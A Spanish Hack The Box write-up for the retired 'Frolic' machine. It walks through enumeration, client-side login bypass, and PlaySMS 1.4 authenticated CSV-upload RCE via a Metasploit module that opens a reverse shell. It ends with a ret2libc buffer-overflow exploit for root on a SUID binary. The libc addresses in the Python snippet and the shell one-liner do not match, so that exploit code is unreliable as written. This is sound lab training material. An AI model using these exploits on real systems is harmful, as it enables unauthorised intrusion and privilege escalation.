---
machine: Frolic
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, ctf, playsms, rce, suid, buffer-overflow, ret2libc]
---

# Frolic — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Máquina con mucha enumeración y sabor a CTF: 22, 1880 (Node-RED) y 9999 (nginx). En el 9999 hay páginas con codificaciones (base64, brainfuck, hex), un ZIP protegido y un `backup` que apunta a `/playsms`. Las credenciales `admin:idkwhatispass` abren PlaySMS 1.4, vulnerable a subida de CSV autenticada → RCE. Para root, un SUID de 32 bits en `/home/ayush/.binary/rop` con buffer overflow y ret2libc.

## Reconocimiento

```bash
nmap -p- --min-rate 1000 -sCV <IP> -oN nmap.txt
```

```text
22/tcp   open  ssh   OpenSSH 7.2p2 Ubuntu
1880/tcp open  http  Node.js (Express middleware)  → Node-RED
9999/tcp open  http  nginx 1.10.3 (Ubuntu)        → "Welcome to nginx!"
```

```bash
gobuster dir -u http://<IP>:9999 -w /usr/share/wordlists/dirb/big.txt -x html,js,txt -r
```

Rutas interesantes: `/admin/`, un directorio con nombre aleatorio (`/asdiSIAJJ0QWE9JAS`), `/js/`, `/dev/` y `/dev/backup/`.

## Acceso

1. **`/admin/`**: el login valida las credenciales en JavaScript (`/js/login.js`); se lee la comprobación y se pasa de largo. La página de éxito enlaza al resto.
2. **Fichero en base64**: el contenido de `/asdiSIAJJ0QWE9JAS` es base64; al decodificarlo sale un ZIP (`impossiblepassword.zip`) con un fichero de texto.
3. **Contraseña del ZIP**: está en una página escrita en brainfuck (se decodifica con `dcode.fr` o un intérprete local). Resultado: `idkwhatispass`.
4. **`/dev/backup/`**: devuelve la cadena `/playsms`. Ahí está el panel de PlaySMS y `admin:idkwhatispass` funciona.

```bash
curl -s http://<IP>:9999/dev/backup/
# /playsms
```

RCE autenticada por importación de CSV (PlaySMS 1.4):

```bash
msfconsole -q
msf6 > use exploit/multi/http/playsms_uploadcsv_exec
msf6 > set RHOSTS <IP>
msf6 > set RPORT 9999
msf6 > set TARGETURI /playsms
msf6 > set USERNAME admin
msf6 > set PASSWORD idkwhatispass
msf6 > set LHOST tun0
msf6 > run
```

Shell como `www-data`; la flag de usuario está en `/home/ayush`.

## Escalada

Enumeración de SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/home/ayush/.binary/rop
```

Es un ELF de 32 bits con SUID de root, NX activo y ASLR desactivado en la máquina:

```bash
file /home/ayush/.binary/rop
checksec --file=/home/ayush/.binary/rop
ldd /home/ayush/.binary/rop
```

El offset hasta `EIP` es 52. Con `gdb`/`pattern_create` se localiza, y con `readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E ' system| exit'` más `strings -a -t x libc.so.6 | grep '/bin/sh'` se monta el ret2libc:

```python
import struct
libc = 0xb7e19000
system = libc + 0x0003a940
exit_  = libc + 0x0002e9d0
binsh  = libc + 0x00158e8b
print("A"*52 + struct.pack("<I", system) + struct.pack("<I", exit_) + struct.pack("<I", binsh))
```

```bash
./rop $(python2 -c 'print "A"*52 + "\xa0\x3d\xe5\xb7" + "\xd0\x79\xe4\xb7" + "\x8b\x8e\x95\xb7"')
# root@frolic
```

## Tropiezos

- Los ficheros del puerto 9999 mezclan codificaciones; no perder tiempo con fuerza bruta antes de decodificar.
- El módulo de Metasploit necesita `TARGETURI /playsms` y el puerto 9999, no el 1880.
- Las direcciones de libc cambian si la máquina se reinicia: recalcular con `ldd`.
- Con ASLR activo el ret2libc directo falla; ahí tocaría filtrado o ROP puro.

## Lecciones

- Un login que se valida en el cliente no es un login.
- PlaySMS 1.4 con subida de CSV autenticada es RCE directa: mantener CMS y plugins al día.
- Un SUID con buffer overflow y ASLR desactivado es root; `checksec` antes de escribir el exploit.
